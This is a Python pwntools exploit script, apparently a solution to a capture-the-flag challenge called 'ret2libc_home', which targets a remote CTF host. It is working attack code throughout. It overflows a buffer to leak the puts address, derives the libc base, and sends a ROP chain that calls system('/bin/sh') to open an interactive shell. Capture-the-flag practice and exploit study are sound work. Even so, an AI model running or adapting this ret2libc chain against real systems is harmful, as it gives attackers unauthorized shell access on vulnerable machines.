#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_home', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET_TO_RIP = 136

POP_RDI   = elf.symbols['pop_rdi_ret']
RET       = 0x000000000040101a
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']
EXIT = libc.symbols["exit"]
SYSTEM = libc.symbols["system"]
binsh_offset = next(libc.search(b"/bin/sh"))
#print(binsh_offset)



#p = process(elf.path)
#p = gdb.debug(elf.path, gdbscript="""
#break main
#continue
#""")
p = remote("offsec.m0lecon.it", 13525)
#p = gdb.debug(elf.path, gdbscript="""
#b *vuln+96
#continue
#""")
# -------- Stage 1: leak puts --------
p.recvuntil(b'Write your message:\n')
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(MAIN),
)
log.info("sending stage1")
p.sendline(stage1)
p.recvline()                        # consume "Let me check..."

log.info("waiting leak...")
leaked = p.recvline().strip()
log.info("stage1 OK")
#print(leaked)
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")

libc_base = leak_puts - libc.symbols['puts']
log.info(f"libc base = {libc_base:#x}")


# -------- Stage 2: system("/bin/sh") --------
#gdb.attach(p)
#p = gdb.debug(elf.path, gdbscript="""
#continue
#""")

binsh  = libc_base + binsh_offset
system = libc_base +  libc.symbols['system']
exit_  = libc_base + libc.symbols["exit"]

log.info("=== STAGE 2 DEBUG ===")
log.info(f"libc base  : {hex(libc_base)}")
log.info(f"system     : {hex(system)}")
log.info(f"binsh      : {hex(binsh)}")
log.info(f"exit       : {hex(exit_)}")

p.recvuntil(b'Write your message:\n')
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET), 
    p64(POP_RDI), 
    p64(binsh), 
    p64(system), 
    p64(exit_),
    )

def is_reasonable(addr):
    return 0x7f0000000000 < addr < 0x7fffffffffff

log.info(f"binsh valid range? {is_reasonable(binsh)}")
log.info(f"system valid range? {is_reasonable(system)}")

try:
    test = p64(binsh)
    log.info("binsh packed OK")
except Exception as e:
    log.error(f"binsh packing failed: {e}")

#print(f"exit_= {exit_}, RIP+OFFSET= {OFFSET_TO_RIP}, RET={RET}, POP_RDI= {POP_RDI}, binsh= {binsh}, system= {system}")
#print(f"stage2= {stage2}")

log.info("sending stage2")
p.sendline(stage2)
log.info("stage2 sent")
p.interactive()

